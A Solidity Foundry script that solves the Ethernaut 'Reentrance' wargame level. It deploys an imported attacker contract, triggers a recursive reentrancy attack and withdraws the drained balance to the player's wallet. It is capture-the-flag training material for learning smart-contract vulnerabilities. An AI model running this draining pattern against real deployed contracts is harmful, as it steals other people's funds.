// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IReentrance} from "../src/interfaces/IReentrance.sol";
import {ReentrancyAttack} from "../src/attackers/ReentrancyAttack.sol";

contract ReentrancyScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");
        address player = vm.addr(privateKey);

        IReentrance target = IReentrance(instance);

        uint256 targetBalanceBefore = instance.balance;

        console2.log("--- Reentrancy Exploit ---");
        console2.log("Target Instance      :", instance);
        console2.log("Target Balance Before:", targetBalanceBefore);
        console2.log("Player Address       :", player);

        if (targetBalanceBefore == 0) {
            console2.log("Target is already drained! Submit instance in Ethernaut.");
            return;
        }

        // We donate whatever the target currently holds (e.g. 0.001 ETH)
        // or a minimum chunk if target has more.
        uint256 depositAmount = targetBalanceBefore;

        vm.startBroadcast(privateKey);

        // 1. Deploy attacker contract
        ReentrancyAttack attackerContract = new ReentrancyAttack(instance);
        console2.log("Deployed ReentrancyAttack at:", address(attackerContract));

        // 2. Launch recursive attack
        attackerContract.attack{value: depositAmount}();

        // 3. Withdraw all stolen funds back to player wallet
        attackerContract.withdrawFunds();

        vm.stopBroadcast();

        uint256 targetBalanceAfter = instance.balance;
        console2.log("Target Balance After :", targetBalanceAfter);
        require(targetBalanceAfter == 0, "Exploit failed: Target still holds balance");
        console2.log(">>> SUCCESS! Reentrancy drained target completely! Submit instance in Ethernaut. <<<");
    }
}
